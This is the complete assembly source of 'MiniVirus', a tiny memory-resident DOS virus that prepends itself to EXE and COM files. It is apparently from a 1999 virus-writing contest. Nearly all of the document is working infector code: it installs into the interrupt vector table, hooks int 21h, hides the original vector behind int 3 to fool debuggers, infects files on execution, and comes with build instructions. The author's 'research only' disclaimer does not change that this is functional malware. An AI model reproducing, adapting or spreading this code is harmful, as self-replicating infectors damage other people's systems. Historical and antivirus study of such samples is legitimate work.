; *************************************************************************
; ********************                                 ********************
; ********************             MiniVirus           ********************
; ********************                by               ********************
; ********************            BLACK JACK           ********************
; ********************                                 ********************
; *************************************************************************

comment ~

NAME: MiniVirus (AVs will call it SillyCER.164, I guess)
AUTHOR: Black Jack /LineZer0 /Metaphase
TYPE: Memory resident prepending infector of DOS EXE and COM files.
SIZE: 164 bytes!

COMMENTS: This virus was written for the tiny '99 open, the coding contest of
	  the *-zine #2. Therefore it is stripped down to its bare bones and
	  as optimized as possible. As far as I know this is the smallest
	  parasitic EXE/COM/TSR virus ever!
	  
DESCRIPTION: When an infected file is run, the virus will install itself
	     memory resident in the upper half of the interrupt vector table,
	     if it wasn't memory resident before. Then it will hook int 21h
	     and redirect the original vector to int 3, which will fool some
	     debuggers and is more optimized. It will then infect EXE and COM
	     files on execute. The virus will prepend its body and save the
	     original beginning of the file to the end (non-destructive
	     overwriting). EXE files are infected exactly the same way as COM
	     files, that means that they are converted to COM format
	     internally, and the EXE header will be interptreted manually by
	     the virus. To reduce code, the virus will only infect EXE files
	     without an relocation table. The virus won't infect any NewExe
	     files or files that are too big or too small. It won't reinfect
	     memory or files.

DRAWBACKS: - is DOS version dependant (depends on initial register values)
	   - crashes if there's an invalid drive in the command line (AX != 0)
	   - can only infect very few EXE files
	   - uses the upper half of the IVT -> instable
	   - insecure residency check, can lead to system crashes

ASSEMBLE WITH: 
		TASM /M minivir
		TLINK minivir
		EXE2BIN minivir.exe minivir.com

DISCLAIMER: I do *NOT* support the spreading of virii in the wild. Therefore,
	    this source was only written for research and education. Please
	    do not spread it. The author and his groups can't be hold
	    responsible for what you decide to do with this source.

~
; ===== CODE STARTS HERE ====================================================

virus_length = ((offset end_virus) - (offset start))
revector     = 3

.model tiny
.radix 10
.386
.code
org 0
start:
	; The virus assumes the following register values at startup:
	; EAX=0
	; BX=0
	; CX=00FFh
	; DX=DS=PSP segment
	; SI=IP=100h
	; DF=0
	
	; the first two instructions are also the virus name: MV - MiniVirus

	dec bp                          ; "M" - infection mark
	push si                         ; save SI=100h to stack
	push es                         ; save ES to stack
	
	mov es, ax                      ; ES=segment 0 (IVT)
	mov di, 200h                    ; ES:DI=0:200h (upper half of IVT)

	scasb                           ; scan first byte of IVT for AL=0
	JNE return                      ; es:[di] != 0 ==> already resident
	dec di                          ; set DI back to 200h
	
					; DOS kindly set the following
					; values for us:
					; DS:SI=start of virus in mem
					; CX=00FFh
					; DF=0
	rep movsb                       ; copy virus to upper half of the IVT

	mov ax, offset new_int21h+200h  ; EAX=new vector for int21h
					; (most significant word of EAX is 0)
	xchg eax, es:[21h*4]            ; set viral int21h routine
	mov es:[revector*4], eax        ; save old int21h vector to int3
					; (int 3 => optimized and anti-debug)

return:
	db 0B8h                         ; mov ax, imm16
offset_org_start dw 0-100h              ; int 20h in PSP to quit 1st gen

	db 0EAh                         ; far jump to virus in memory to
	dw (offset restore + 200h)      ; restory the host
	dw 0

; ----- RESTORE HOST --------------------------------------------------------

restore:
	pop es                          ; restore ES
	pop di                          ; DI=100h
	mov si, ax                      ; SI = offset of original file start
	add si, di                      ; move original .COM start back
	
	push es                         ; push far address of starting
	push di                         ; point of host

	cmp byte ptr [si], "M"          ; is the host an .EXE file?        

	mov cl, virus_length            ; CH is already zero
	rep movsb                       ; move original .COM start back

	JE restore_exe

	retf                            ; execute host
	
restore_exe:
	pop di                          ; restore DI

	xchg ax, cx                     ; move the whole host back
					; (DI afterwards will be SI before)
	mov si, [si+8-virus_length]     ; size of header in paragraphs
	shl si, 4                       ; convert to bytes
	add si, di                      ; DI=100h (PSP size)
	rep movsb                       ; move host where it belongs
	
	add dx, 10h                     ; add PSP size to DX (=CS)
	add [di+16h], dx                ; fix code-segment address
	
	add dx, [di+0Eh]                ; DX=stack-segment
	mov ss, dx                      ; set original stack segment
	mov sp, [di+10h]                ; set original stack-pointer

	jmp dword ptr [di+14h]          ; jump to original entry point!


; ----- INT 21h HOOK --------------------------------------------------------

new_int21h:
	cmp ah, 4Bh                     ; execute?
	JNE org_int21h                  ; if so, infect .COM/.EXE

infect_exec:
	pusha                           ; save registers
	push ds

	mov ax, 3D02h                   ; open file r/w
	int revector
	xchg bx, ax                     ; handle to BX where it belongs
	
	push cs                         ; DS=CS
	pop ds

	mov si, 300h                    ; SI=buffer for COM start/EXE header
	
	mov ah, 3Fh                     ; read from file
	mov dx, si                      ; DS:DX=pointer to buffer
	mov cx, virus_length            ; length of virus
	int revector
	sub cx, ax                      ; filelength < viruslength ?
	JNZ close                       ; if so, don't infect
	
	mov ax, 4202h                   ; move filepointer to EOF
	cwd                             ; DX=0; CX was already 0 before
	int revector
	
	mov [offset_org_start+200h], ax ; save length of file (=offset of
					; original com start or EXE header)

	mov ah, 40h                     ; write to file/NewExe marker

	cmp byte ptr ds:[si], 'M'       ; is it already infected or EXE?
	JNE com_file                    ; it's an uninfected .COM file
	
exe_file:                               ; test if it is an infectable .EXE
					; (will also avoid reinfections)
					
	cmp word ptr ds:[si+6], dx      ; no relocation items? (DX=0 if the
					; file is smaller than 64KB,otherwise
					; we can't infect the file anyways)
	JNE close                       ; close if it has an relo table

	cmp byte ptr ds:[si+18h], ah    ; is it any new exe file?
	JE close                        ; we just want to infect DOS EXEs
	
com_file:
					; write original com start to EOF                                        
					; AH is already 40h
	mov dx, si                      ; DS:DX=pointer to buffer
	mov cl, virus_length            ; CX=length to write (CH is already 0)
	pusha                           ; save all registers
	int revector
	
	mov ax, 4200h                   ; move filepointer to beginning of file
	xor cx, cx                      ; DX:CX=0 (new offset relative to SOF)
	cwd                             ; DX=0
	int revector
	
	popa                            ; AH=40h; CX=virus_length; DL=0
	mov dh, 2                       ; DX=200h=start of virus in memory
	int revector                    ; write firus into file
	
close:
	mov ah, 3Eh                     ; close file
	int revector

	pop ds                          ; restore registers
	popa

org_int21h:                             ; back to original int 21h
	int revector
	retf 2
	
end_virus:

end start
